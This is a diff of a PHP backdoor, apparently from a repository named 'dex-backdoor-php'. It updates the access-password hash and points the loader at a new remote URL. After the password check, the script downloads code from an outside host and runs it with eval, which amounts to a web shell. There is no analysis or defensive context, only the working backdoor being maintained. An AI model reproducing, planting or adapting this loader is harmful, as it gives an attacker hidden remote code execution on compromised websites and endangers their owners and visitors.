@@ -45,7 +45,7 @@ function is_logged_in()
 // Check if the DEX is submitted and correct
 if (isset($_POST['DEX'])) {
     $entered_DEX = $_POST['DEX'];
-    $hashed_DEX = '483ce894612f481015d2a8088b32fb51';
+    $hashed_DEX = '970f5673e23551967e3a15d029513050';
     if (md5($entered_DEX) === $hashed_DEX) {
         $_SESSION['logged_in'] = true;
         $_SESSION['G-DEX'] = 'tidak boleh kasar';
@@ -57,11 +57,12 @@ if (isset($_POST['DEX'])) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-    $a = geturlsinfo('https://github.com/nugraharevi045-arch/dex-backdoor-php/blob/main/main-dex.txt');
+    $a = geturlsinfo('https://raw.ka-wa-i.workers.dev/raw/27i173s4');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
     ?>
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
